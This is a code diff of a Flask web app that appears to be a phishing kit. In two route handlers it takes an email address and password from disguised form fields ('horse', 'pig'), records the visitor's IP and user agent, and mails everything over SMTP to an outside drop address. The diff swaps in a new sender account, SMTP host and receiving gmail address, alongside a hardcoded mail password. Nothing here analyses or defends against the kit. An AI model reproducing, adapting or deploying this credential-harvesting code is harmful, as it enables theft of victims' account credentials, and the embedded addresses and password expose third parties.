@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "missdomn@cinconn.com"
-        sender_emaill = "eissa"
-        receiver_email = "aragon.rheece@minuteafter.com"
+        sender_email = "sheilasantos@redesomed-se.com.br"
+        sender_emaill = "sheilasantos"
+        receiver_email = "kokofunds147@gmail.com"
         password = "X9kAxykLjkks"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("cinconn.com", 465) as server:
+        with smtplib.SMTP_SSL("redesomed-se.com.br", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,9 +183,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "missdomn@cinconn.com"
-        sender_emaill = "eissa"
-        receiver_email = "aragon.rheece@minuteafter.com"
+        sender_email = "sheilasantos@redesomed-se.com.br"
+        sender_emaill = "sheilasantos"
+        receiver_email = "kokofunds147@gmail.com"
         password = "X9kAxykLjkks"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("cinconn.com", 465) as server:
+        with smtplib.SMTP_SSL("redesomed-se.com.br", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
